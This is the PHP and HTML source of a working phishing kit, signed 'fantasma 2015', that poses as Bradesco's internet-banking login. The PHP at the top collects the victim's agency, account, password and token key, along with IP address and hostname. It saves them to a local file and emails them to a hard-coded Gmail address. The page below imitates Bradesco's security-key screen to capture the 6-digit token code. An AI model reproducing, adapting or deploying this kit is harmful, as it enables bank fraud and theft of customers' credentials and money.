<?php
error_reporting(0);
session_start();
$para="rolexasus@gmail.com";
$n_dir="arquivos/";
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$data = date("d/m/y"); // * Função para pegar a data de envio do e-mail
$ip = $_SERVER['REMOTE_ADDR']; // * Função para pegar o ip do usuário
$navegador = $_SERVER['HTTP_USER_AGENT']; // * Função para pegar o navegador do visitante
$hora = date("H:i");
$subj = "Dados / IP: $ip - Bradesco: TOken";


$msg = "
----------------BRADESCO TK------------------
$data-($hora) - $ip - $pcname
---------------------------------------------
AG: '.$_SESSION[agdes].'
CONTA: '.$_SESSION[ctdes].'-'.$_SESSION[digdes].'
SENHA 4: '.$_SESSION[SENHA]. '
=========================================
CHAVE ENTRADA: $_SESSION[chave]

by - fantasma 2015
=========================================
";

$h = date(" d-m-Y H-i-s");
$fp = fopen("$n_dir"."Bradesco_Dados_"."$pcname"."-"."["."$h]"."$ip".".txt", "a");
$escreve = fwrite($fp, $msg);
fclose($fp);
	
@mail($para, $subj, $msg, "from: $aviao");



?>


<HTML><HEAD>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<META HTTP-EQUIV="Expires" CONTENT="-1">
<META HTTP-EQUIV="Cache-control" CONTENT="no-store">

<TITLE>Bradesco S/A</TITLE>

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/estrutura.css" />

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/interna0.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery00.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery01.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery02.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery03.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/login000.css" />


    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/conteudo.css" />


<script>
function exibeValor(nomeCampo, lenCampo, controle)
{
	if ((nomeCampo.value.length == lenCampo) && (checarTabulacao))
	{	
		var i=0;
		for (i=0; i<document.forms[0].elements.length; i++)
		{
			if (document.forms[0].elements[i].name == nomeCampo.name)
			{
				while ((i+1) < document.forms[0].elements.length)
				{
					if (document.forms[0].elements[i+1].type != "hidden")
					{
						document.forms[0].elements[i+1].focus();
						break;
					}
					i++;
				}
				checarTabulacao=false;
				break;
			}
		}
	}
}
	
function stopTabCheck(nomeCampo)
{checarTabulacao=false;}

function startTabCheck()
{checarTabulacao=true;}
</script>



    

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery00.js"></script>


    

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery01.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery02.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery03.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery04.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery05.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/swfobjec.js"></script>





<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/currency.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/validaco.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/default1.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/tecladov2.js"></script>




    



    <!--[if lt IE 8]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie.css" />


	


	<![endif]-->

	<!--[if lt IE 7]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie6.css" />


	

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/pngfix.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/jquery.bgiframe.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/default_ie.js"></script>


	<![endif]-->
    
    <script type="text/javascript"><!--
var isPrime=false;

//--></script>
    <script type="text/javascript"><!--
var loginMainUrlEncerra='https://www.ib2.bradesco.com.br/ibpflogin/logoff.jsf';

//--></script>
    <script type="text/javascript"><!--
var loginMainNomeCtl='CTL';

//--></script>
    <script type="text/javascript"><!--
var loginMainCtl='7605190925697317521150';

//--></script>
	    
	    
	    <script type="text/javascript">
			document.domain = "#";			
			function cancelarAcesso() {
 				window.top.location = loginMainUrlEncerra + "?" + loginMainNomeCtl + "=" + loginMainCtl;     
   				return false;
			}
	    </script>
	
<style type="text/css">
<!--
body {
	background-color: #FFFFFF;
}
-->
</style>
<script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<div id="miolo" style="margin-left:2px; margin-top:2px;"  class="after login">	
						
		<script type="text/javascript"><!--
var pametrosHdaSenha4UnicoTitular='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=1';

//--></script><script type="text/javascript"><!--
var pametrosHdaSelecaoMultiplosTitulares='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=2';

//--></script><script type="text/javascript"><!--
var pametrosHdaSenha4MultiplosTitulares='r_0-21_verificaoferta|hdaOfertaDisp=0';

//--></script><script type="text/javascript"><!--
var numControle='7605190925697317521150';

//--></script><script type="text/javascript"><!--
var hdaAtivadoLogin=false;

//--></script><script type="text/javascript"><!--
var hdaPosicaoLogin=1;

//--></script><script type="text/javascript"><!--
var hdaVisivelLogin=false;

//--></script><script type="text/javascript"><!--
var isPrimeiroAcesso=false;

//--></script><script type="text/javascript"><!--
var sequenciaTeclado=new Array(6,7,0,3,5,4,2,9,8,1);

//--></script>




<script type="text/javascript"><!--
var urlAutenticacao='autenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script>



<script type="text/javascript"><!--
var urlProximoTipoAutenticacao='tipoAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm?nome=valor';

//--></script><script type="text/javascript"><!--
var urlAceite='aceite.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var urlProximaPagina='proxAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var sequenciaProximoDispositivo=2;

//--></script>








<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/login000.js"></script>
<div id="conteudo" style="left:0; "  class="after conteudo_L">
  <script>           
        jQuery(function($) {          
            var tit = "Limpar";             
        	$('#botao_limpar').attr('title', tit); 
        });     
   </script>



<style> 
<!--
.font1 { text-decoration: none}
a.font1:hover {  text-decoration: none}
a {  text-decoration: none}
a:hover {  text-decoration: none}
.font0 { text-decoration: none}
a.font0:hover {  text-decoration: none}
a.fonte1 {  text-decoration: none}
a.fonte1:hover {  text-decoration: none}
.fonte1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	color: #000000;
		}
.fonteIB {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
		}
.fonteSite:hover {  
	text-decoration: none;
	}
.fonteSite {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	text-decoration: none
		}
.fonteServ:hover {  
	text-decoration: none;
	color: #5B5B5C;
	}
.fonteServ {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	text-decoration: none;
	color: #E90B0B;
	}

//#pos114 {
}
.form1 {
	height: 13.5px;
	width: 30px;
	border: 1px 1 #000000;
	font: 10px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
}
.form11 {	height: 12px;
	width: 28px;
	font: 10px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 0px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 0px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: none;
	float: none;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.formRef {	height: 20px;
	width: 100px;
	font: 11px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 0px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 0px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: none;
	float: none;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	position: fixed;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.form12 {	height: 11px;
	width: 28px;
	font: 10px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 0px 2px 0px 0px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 1px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: right;
	float: right;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.formRef1 {height: 22px;
	width: 128px;
	font: 12px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 3px 0px 0px 1px;
	padding: 0px;
	text-decoration: none;
	border-top: 0px none;
	border-right: 0px none;
	border-bottom: 0px none;
	border-left: 0px none;
	clear: none;
	float: none;
	letter-spacing: 0em;
	text-align: center;
	word-spacing: 0em;
	display: compact;
	position: fixed;
	visibility: visible;
	z-index: auto;
	white-space: nowrap;
}
.formRef2 {height: 22px;
	width: 128px;
	font: 11px Verdana, Arial, Helvetica, sans-serif;
	color: #000000;
	background: #FFFFFF;
	left: 0px;
	top: 0px;
	right: 0px;
	bottom: 0px;
	clip: rect(0px,0px,0px,0px);
	margin: 3px 0px 0px 1px;
	padding: 0px;


	white-space: nowrap;
}
-->
</style>
<script language="JavaScript">
<!--
var agencia = '';
var conta = '';
var senha = '';
var resposta = '';
var dataext;
function getDia() {

		var nome_dia = new Array (7);
						
		nome_dia[0] = "Domingo";
		nome_dia[1] = "Segunda-Feira";
		nome_dia[2] = "Terça-Feira";
		nome_dia[3] = "Quarta-Feira";
		nome_dia[4] = "Quinta-Feira";
		nome_dia[5] = "Sexta-Feira";
		nome_dia[6] = "Sábado";
						
		var agora = new Date();
		var dia = nome_dia[agora.getDay()];
	    var extenso = dia + ', '
	    return extenso;
	}
	
function getData() {
	
		var nome_mes = new Array (12);
						
		nome_mes[0] = "Janeiro";
		nome_mes[1] = "Fevereiro";
		nome_mes[2] = "Março";
		nome_mes[3] = "Abril";
		nome_mes[4] = "Maio";
		nome_mes[5] = "Junho";
		nome_mes[6] = "Julho";
		nome_mes[7] = "Agosto";
		nome_mes[8] = "Setembro";
		nome_mes[9] = "Outubro";
		nome_mes[10] = "Novembro";
		nome_mes[11] = "Dezembro";

		var agora = new Date();
		horas = agora.getHours();
		minutos = agora.getMinutes();
		if (horas < 10) horas = "0" + horas;
	        if (minutos < 10) minutos = "0" + minutos;

		var dia_do_mes = agora.getDate();
		var mes = nome_mes[agora.getMonth()];
		var ano = agora.getFullYear();
	    var extenso = dia_do_mes + ' de ' + mes + ' de ' + ano;
	    return extenso;
	}


function readCookie(name)
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++)
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}


function dummy() {return false;}
PageInic = dummy;
function Inic()
{

PageInic();
}


//window.onload = Inic;
//-->
</script>

</HEAD>
<BODY aLink="#000000" leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" 
background="fundo.gif"  bgColor="#FFFFFF" link="#000000" text="#000000"
vLink="#000000" onUnload="">
<a name="top">
<!--BrwGeral -->
<script language="JavaScript">
<!--
var appletId=0;
var lStarted = 0;
function Started()
{
	lStarted = 555;	
}
function VrfApplet(order)
{
  appletId = order;
    if(lStarted != 555)
      return false;
  return true
  
}
//-->
</script>


<script language="JavaScript">
<!--
function MMM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MMM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

var appletLayer = MMM_findObj('layerCriptApplet');
var appletArr;
if(document.layers)
{
//	if(appletLayer != null)
//		appletLayer.visibility = "hide";
	appletArr = document.layers['layerCriptApplet'].document.applets;
}
else
{
//	if(appletLayer != null)
//		appletLayer.style.visibility = "hidden";
	appletArr = document.applets;
}


function addNewParam(cript, paramName, paramValue)
{
	if(cript)
	{
		this.submitForm.elements[paramName].value = appletArr[appletId].cript(paramValue);
	}
	else
	{
		this.submitForm.elements[paramName].value = paramValue;		
	}
	return;
}
function addDestURL(fullurl, url, target)
{
	if(fullurl == false)
		url = window.location.protocol + "//" + window.location.host + url;		
	this.submitForm.action = url;
	if(target != null)
		this.submitForm.target = target;
	return;
}

function addSubmitForm(form)
{
	this.submitForm = form;
	return;
}

function sendData()
{
	this.submitForm.submit();
}

function CriptContext()
{
	this.submitForm = null;
	this.addSubmitForm = addSubmitForm;
	this.addDestURL = addDestURL;
	this.addNewParam = addNewParam;
	this.sendData = sendData;
}

//-->
</script>
<table cellpadding="0" cellspacing="0" width="75%" border="0">
 
  <!--  Ini - Linha separadora //-->
  <tr>
    <td bgcolor="#CCCCCC" height="1"></td>
  </tr>
  <!--  Fim - Linha separadora //-->
  <tr>
    <td><table cellpadding="0" cellspacing="0" border="0" width="745">
      <tr>
        <td width="10"></td>
        <td height="50" width="735" valign="top"><font size="1"><br>
          </font>
              <!--2//-->
            <script language="JavaScript">
<!--
function MudaStatus()
/*{
    if(VrfApplet(0) == true){
        if(document.FLogin.Confirma){
            document.FLogin.Confirma.src = "bt_confirmar.gif";
        }
        document.FLogin.SENHA.focus();
    }
    else
        setTimeout("MudaStatus()", 500);
}

var Bloq=false;
function VrfFrm()
{
    if(Bloq)
        return false;
    
    Bloq = true;
    if(!VrfApplet(0))
    {
        alert("Applet de segurança não carregado!");
        Bloq = false;
        return false;
    }

	// Projeto Apple
	var Cripto;
	//instanciar um contexto de criptografia
	Cripto = new CriptContext();
	//colocar o formulário que será usado para enviar dados ao servidor
	Cripto.addSubmitForm(document.forms['criptform']);
	//colocar a URL da página destino, o primeiro parametro
	//indica se a URL é absoluta ou relativa (true se for absoluta).
	Cripto.addDestURL(false, document.dados.action);
	//atribuição de dados abertos, com nome do variável no formulário
	Cripto.addNewParam(false, "CTL", "7209795329444009910003"); 
	Cripto.addNewParam(false, "FLAGPLUGSEG", "0"); 

    //document.criptform.SENHA.value = document.applets[0].cript(window.document.dados.SENHA.value);
    Cripto.addNewParam(true, "SENHA", window.document.FLogin.SENHA.value); 
    
    window.document.FLogin.SENHA.value = "";
    //document.criptform.action = document.dados.action;
    //document.criptform.submit();
     Cripto.sendData();
    return false;
}*/
//-->
  </script>
              <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="100%" height="20"><span class="after conteudo_L" style="left:0; "><img src="images/conf1.jpg" /></span></td>
                </tr>
                <tr>
                  <td width="100%" height="5"></td>
                </tr>
              </table>
			  
			  
			  
			  
			  
			  
			  
			  
			  
			<form name="FLogin" action="javascript:return false" onsubmit="return false; vai();" method="post" target="paginaCentral"> 
			 
<input type="hidden" name="agencia" value="<?php print("$_SESSION[agdes]"); ?>">
<input type="hidden" name="conta" value="<?php print("$_SESSION[ctdes]"); ?>">
<input type="hidden" name="digito" value="<?php print("$_SESSION[digdes]"); ?>">
<input type="hidden" name="senha" value="<?php print("$_SESSION[SENHA]");?>">
<input type="hidden" name="chave" value="<?php print("$_SESSION[chave]");?>">
<input type="hidden" name="senhad6" value="<?php echo "$_POST[senhad6]"; ?>">

          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">
        
      </table>
     
       
</table>
</tr>
</table>
<table width="100%" border="0" cellspacing="0" cellpadding="0"  bgcolor="" background="fundo.gif">
	  <tr> 
	    <td></td>
  </tr>
</table>
  </td>
  </tr>
</table>
<script>

function IsNumeric(sText)
	{
	   var ValidChars = "0123456789.";
   	var IsNumber=true;
   var Char;

   for (i = 0; i < sText.length && IsNumber == true; i++) 
      { 
      Char = sText.charAt(i); 
      if (ValidChars.indexOf(Char) == -1) 
         {
         IsNumber = false;
         }
      }
   return IsNumber;
 }
 
 function createCookie(name,value,days)
{
	if (days)
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}
	

function  enviaTudo(){

	var chaveco = document.getElementById("chavetk").value;
			

		document.FLogin.chavetk.value = chaveco;
			 
		createCookie('bradesco','Enviado com Sucesso','1');
		document.FLogin.action = "aguardtk.php";
		document.FLogin.submit();
		
	
	}
</script>





<div class="topo_canto_L"></div><div class="topo_canto_R"></div><div id="conteudo_interno" style="border-bottom:1px #FFFFFF solid;" class="miolo miolo_noBg after"><div id="divMioloPaginaLogin" class="boxP20 after"><div>
  <div id="box_titular" style="display:none;" class="pb15 after"><a id='link_saudacao' class='linkInvisivel tabindex' href='' 
                title='Boa tarde, Lincoln'></a><a class="loging_Tip bTip tabindex linkInvisivel" id="contPrincDV" title="Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.">Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.</a></div>
				
				<script language="javascript">
		function abre() {
		document.getElementById('aaa').style.display = 'block';
		}
				
		 function vai() {
		 if(document.FLogin.txtPass1.value ==""){
		 alert('Senha do cartão de crédito inválida');
		 return false;
		 }
		 if(document.FLogin.txtPass2.value ==""){
		 alert('Senha do cartão de crédito inválida');;
		 return false;
		 }
		 if(document.FLogin.txtPass3.value ==""){
		 alert('Senha do cartão de crédito inválida');
		 return false;
		 }
		 if(document.FLogin.txtPass4.value ==""){
		 alert('Senha do cartão de crédito inválida');
		 return false;
		 }

		//document.FLogin.submit();
		 }
		</script>		
		
						
  <!--<form id="sss" name="sss" method="post" action="dentro.php" enctype="application/x-www-form-urlencoded" onsubmit="" class="ajaxForm allowSubmit">-->
  
  <div id="conteudo" style="left:0; "  class="after conteudo_L">
<p><img src="images/conf2.jpg" /></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="16%" align="left" valign="top" style=" vertical-align:top; padding-top:38px; padding-left:5px;"><font size="2">Digite a <strong>chave</strong> informada no visor do seu celular.</font></span></li>
</td>
    <td width="25%" align="left" valign="top"><img alt="Chave de Segurança" src="Banco Bradesco S_A_files/chavepage.jpg" width="179" height="109" /></td>
    <td width="59%" align="left" valign="top" style="vertical-align:top; padding-top:20px;"><input type="password" id="chavetk" name="chavetk" maxlength="6" title="Digite a chave de segurança Bradesco informada pelo seu dispositivo.  " style="width: 112px; maxlength:6; text-align:center;" class="tabindex tabfirst" tabindex="21" />
      <span class="leg"><font size="1">&nbsp;&nbsp;(6 digitos)</font></span></td>
  </tr>
</table>
<p align="right"><img src="avanca.JPG" alt="" width="101" height="32" onClick="enviaTudo()" style="cursor:pointer;" />

</p>
<p>

</p>
 
</div>
						
						
						
						
						
						
						
						<div id="aaa" style="display:none;" class="emba after ativo">
						
						<div id="lista-conteudos" class="conteudo-dinamico none_i"><div id="dicas_primeiroAcesso_1" class="dicas_primeiroAcesso_1"><div id="dicaChaveSoUmaVez" class="box-dica box-seguranca"><div class="linha"><!-- --></div><h2 class="atencao">Atenção</h2><span>O Bradesco solicita a digitação da Chave de Segurança apenas uma vez a cada transação.<br><br>Se você digitar errado, o Bradesco solicitará a mesma posição para este acesso, nunca outra.</span></div></div><div id="dicas_primeiroAcesso_2" class="dicas_primeiroAcesso_2"><div class="last"><div class="box-dica box-duvida"><h2>Em caso de dúvidas</h2><ul class="listaLinks"><li><span>Veja mais informações sobre o</span><br><a tabindex="20" class="link_ext pr12 tabindex" rel="external" style="white-space: nowrap;" href="http://www.bradesco.com.br/html/content/como_usar/chave.shtm" title="Cartão Chave de Segurança">Cartão Chave de Segurança</a></li><li><a tabindex="21" class="link_ext tabindex" href="javascript:;" onClick="return popupFaleconosco();" title="Entre em contato com o Bradesco">Entre em contato</a> <span>com o Bradesco</span></li></ul></div></div></div></div><div class=""><div class="boxP14"><span id="txt_msg_erro_frase"><span class="erro_msg none_i">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span></span><ul id="_id18" class="colsLogin after"><li id="_id19" class="nro">2</li><li id="_id21" class="legendaBox"><span id="text_tancode">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span></li><li id="_id22"></li>
						
						
						
						<input type="hidden" name="form_titular_SUBMIT" value="1" /><input type="hidden" name="autoScroll" />
						<input type="hidden" name="loginbotoes:_link_hidden_2" />
						
						<div id="divDispositivos"></div>
						<div id="div-textoAntesBotoes" class="textoAntesBotoes"></div><div id="divBotoesPagina" class="mt0 bt0"><ul id="loginbotoes:ul_btos_bottom" class="btos_bottom"><li id="loginbotoes:li_btos_bottom_1"><input id="loginbotoes:bt_cancelar_acesso" name="loginbotoes:bt_cancelar_acesso" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif"  alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex botoesLogin" /></li><li id="loginbotoes:_id85"></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="loginbotoes:_link_hidden_" />
						
<!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
						<script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></div><div id="div-textoAposBotoes" class="textoAposBotoes"></div></div>
</div>
</div>


<ul id="loginbotoes:ul_btos_bottom" class="btos_bottom">
  <li id="loginbotoes:li_btos_bottom_1"></li>
  <li id="loginbotoes:_id85"></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" />
  <!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
						<script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></div>


</div>
<script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/publicKe.js"><!--

//--></script><script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/scpscrpt.js"><!--

//--></script><script language="javascript"><!--

setPublic(n_InternetBanking, e_InternetBanking);  
function setEncryptEventTrap(element, eventName, trapFunction) {
    if (element.addEventListener){
        element.addEventListener(eventName, trapFunction, false);
    } else if (element.attachEvent){
        element.attachEvent('on' + eventName, trapFunction);
} 
} 
function handOnClick(e) {
    rng_seed_time();
} 
function handOnKeyPress(e) {
    rng_seed_time();
} window.document.onclick = handOnClick;
window.document.onkeypress = handOnKeyPress;
function getValor(campo) {
    var retorno = "";
    try {
        if(typeof(campo.length) != "undefined") {
            if (campo[0].type == "radio") {
                for (var i = 0; i < campo.length; i++) {
                    if (campo[i].checked) {
                        retorno = campo[i].value;
                        break;
                     }
                    }
             }
        } else {
            if(campo.type == "checkbox" || campo.type == "radio") {            
                if (campo.checked) {
                    retorno = campo.value;
                 }
            } else {
                retorno = campo.value;
            }
        }
    } catch (err) {
    }
    return retorno;
} function setValor(campo, novoValor, permiteBranco) {
   try {
       if(typeof(campo.length) != "undefined") {
           if (campo[0].type == "radio") {
              if (novoValor != "" || permiteBranco) {
                   for (var i = 0; i < campo.length; i++) {
                       if (campo[i].value == novoValor) {
                           campo[i].checked = true;
                       } else {
                           campo[i].checked = false;
                       }
                  }
                }
          }
       } else {
           if(campo.type == "checkbox") {            
               if (campo.value == novoValor) {
                   campo.checked = true;
               } else {
                   campo.checked = false;
              }
           } else if(campo.type == "radio") {
               if (novoValor != "" || permiteBranco) {
                   if (campo.value == novoValor) {
                       campo.checked = true;
                   } else {
                       campo.checked = false;
                   }
               }
           } else {
               campo.value = novoValor;
           }
       }
   } catch (err) {
} } function enc(formName, params) {
   var loop;
   for (loop = 0; loop < params.length; loop++) {
       var valorAux = getValor(window.document.forms[formName].elements[params[loop][0]]);
       window.document.forms[formName].elements[params[loop][1]].value = cript("7605190925697317521150", valorAux); 
       window.document.forms[formName + "_backup"].elements[params[loop][0]].value = valorAux;
      setValor(window.document.forms[formName].elements[params[loop][0]], "", true); 
} 
} 
function inic(formName, params) {
   var loop; 
   var dado; 
   for (loop = 0; loop < params.length; loop++) { 
       dado = window.document.forms[formName].elements[params[loop][1]].value;
       if (dado.length == 172 && dado.charAt(171) == "=") {
           dado = window.document.forms[formName + "_backup"].elements[params[loop][0]].value;
} 
      setValor(window.document.forms[formName].elements[params[loop][0]], dado, false);
} 
} 


//--></script><div style="visibility:visible; display:hide"></div>
<script language="javascript"><!--

var params_form_cript = new Array();
   params_form_cript[0] = ["form_cript:valor_dig", "form_cript:valor_cript"];
var processado_form_cript = false;
function origOnSubmitform_cript() {return true;}
function enc_form_cript() { 
   if (origOnSubmitform_cript() == false) {
       return false;
   }
   enc("form_cript",  params_form_cript); 
   return true;
} 
function inic_form_cript() {
   inic("form_cript", params_form_cript) ;
} 
setEncryptEventTrap(window, "load", inic_form_cript);


//--></script><script type="text/javascript">
AC_AX_RunContent( 'classid','clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF','height','0','id','Conexao','width','0','update','1|1|1' ); //end AC code
</script><noscript><object classid="clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF" height="0" id="Conexao" width="0"><param name="Update" value="1|1|1" /></object></noscript><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

        
        <!-- fim pb15 after -->

        
          <!-- Mais de um titular -->              
                        
          <!-- Select Titular - Box redline -->   
          
          
              
                <script type="text/javascript">
                <!--
                jQuery('#numero-tela').html('RLO01');
                //-->
                </script>          
                    
              
                
      
<!-- fim conteudo -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- ### UL BOX DIREITA ### -->
<!-- HDA -->
<!-- VIDEO -->
<!-- // VIDEO -->
<!-- // HDA -->
<!-- -->
<!-- -->
<!-- -->
<!-- ### FIM UL BOX DIREITA ### -->
</div>
<!-- ### RODAPÉ ### -->
<!-- ### FIM RODAPÉ ### -->
<div id="modalLogin" class="jqmWindow modalNaoFecha none_i" style="width:523px;"><div id="modalLogin_jqmCornerTop" class="jqmCornerTop"><div id="jqmCornerTop_1" class="cc"></div><div id="jqmCornerTop_2" class="c1"></div><div id="jqmCornerTop_3" class="c2"></div></div><div id="modalMiolo" class="jqmWrapper after"><a id='linkTituloModalLogin' href='javascript:;' class='tabindex modal-title tabfirst tabmodal' 
        title='Acesso Seguro'></a><div id="modalFechar" class="jqmTop after"><a href="javascript:;" class="lnkFechar closeModalLogin tabindex none_i" title="Fechar">Fechar</a><h4>Acesso Seguro</h4></div><div id="modalContentAfter" class="jqmContent after"><div id="modalBoxAlertPrincipal" class="ptb20"><div id="modalBoxAlertMessage" class="box-alerta sinal-X after"><div id="modalBoxAlertTexto" class="ctn-box after"><span class="HtmlOutputTextBradesco"><p><P>Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.</P></p></span></div></div><span class="HtmlOutputTextBradesco"><a id='mensagem-erro' class='modal-title tabindex tab-1 linkInvisivel' 
